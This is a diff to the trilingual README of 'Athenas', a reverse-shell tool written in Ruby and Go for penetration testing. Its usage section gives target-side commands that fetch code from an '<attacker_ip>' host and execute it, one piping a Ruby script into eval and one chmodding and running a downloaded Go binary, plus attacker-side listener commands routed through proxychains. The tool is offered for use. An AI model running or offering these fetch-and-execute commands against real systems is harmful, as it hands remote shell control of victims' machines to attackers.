@@ -1,13 +1,13 @@
 # Athenas
-🇧🇷 - Uma reverse shell construída em ruby para o uso focado em CTF's e testes de penetração casuais, já que se trata de uma linguagem interpteada. 
+🇧🇷 - Uma reverse shell construída em ruby para o testes de penetração. Agora para ambientes onde pode ser utilizado a linguagem interpretada e compilada 
 Utiliza um sistema onde a porta de conexão é fornecida pelo alvo, e não pelo atacante, possibilitando o uso de proxy's e conexões em intervalos, devido ao loop de execução.
 
 
-🇬🇧 - A reverse shell built in Ruby for use focused on CTFs and casual penetration testing, as it is an interpreted language.
+🇬🇧 -A reverse shell built in Ruby for penetration testing. Now for environments where the interpreted and compiled language can be used.
 It uses a system where the connection port is provided by the target, not the attacker, allowing the use of proxies and connections at intervals, due to the execution loop.
 
-🇨🇳 一个用 Ruby 构建的反向 shell，用于专注于 CTF 和非正式的渗透测试，因为它是一个解释型语言。
-它使用一个系统，其中连接端口由目标提供，而不是攻击者，允许使用代理和连接，因为执行循环。
+🇨🇳 一个用Ruby编写的用于渗透测试的反向shell。现在适用于可以使用解释型和编译型语言的环境。
+它使用一个系统，其中连接端口由目标提供，而不是攻击者提供，允许使用代理和在间隔内进行连接，这是由于执行循环的原因。
 
 ## Usage:
 > RSA:
@@ -26,8 +26,17 @@ openssl rsa -in server_private_key.pem -pubout -out server_public_key.pem
 ```
 > Target:
 ```
-cirl http://<attacker_ip>/target.rb | ruby -e 'eval(STDIN.read)'
+curl http://<attacker_ip>/target.rb | ruby -e 'eval(STDIN.read)'
 #or just download it.
+
+=========================
+        GOLANG:
+=========================
+go build main.go
+
+curl http://<attacker_ip>/target | chmod 777 target | /path/to/target --port <port>
+
+=========================
 ```
 
 > Attacker
@@ -35,6 +44,13 @@ cirl http://<attacker_ip>/target.rb | ruby -e 'eval(STDIN.read)'
 ruby attacker.rb
 #or
 proxychains4 attacker.rb
+=========================
+        GOLANG:
+=========================
+go build aaa.go
+
+./file --server <server> --port <port>
+
 ```
 ### soon:
 * Binary files.
